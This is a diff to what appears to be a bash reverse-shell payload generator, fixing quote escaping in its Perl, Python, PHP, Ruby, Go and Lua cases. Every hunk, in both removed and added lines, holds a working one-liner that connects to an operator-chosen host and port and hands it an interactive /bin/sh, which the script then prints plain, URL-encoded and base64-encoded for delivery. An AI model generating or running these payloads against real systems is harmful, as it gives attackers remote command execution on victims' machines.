@@ -90,7 +90,7 @@ case $langu in
 	 echo "message" |base64 -w0;;
 
 	3)
-	 message="perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+	 message="perl -e 'use Socket;$i=\"$lhost\";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
@@ -98,7 +98,7 @@ case $langu in
 	 echo "$message" |base64 -w0;;
 
 	4)
-	 message="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+	 message="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
@@ -107,7 +107,7 @@ case $langu in
 
 
 	5)
-	 message="php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	 message="php -r '$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
@@ -115,7 +115,7 @@ case $langu in
 	 echo "$message" |base64 -w0;;
 
 	6)
-	 message="ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+	 message="ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
@@ -123,7 +123,7 @@ case $langu in
 	 echo "$message" |base64 -w0;;
 
 	7)
-	 message="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+	 message="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$lhost\":\"$lport\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
@@ -131,7 +131,7 @@ case $langu in
 	 echo "$message" |base64 -w0;;
 
 	8)
-	 message='lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('$lhost',$lport);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"'
+	 message='lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('$lhost',$lport);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\"'
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
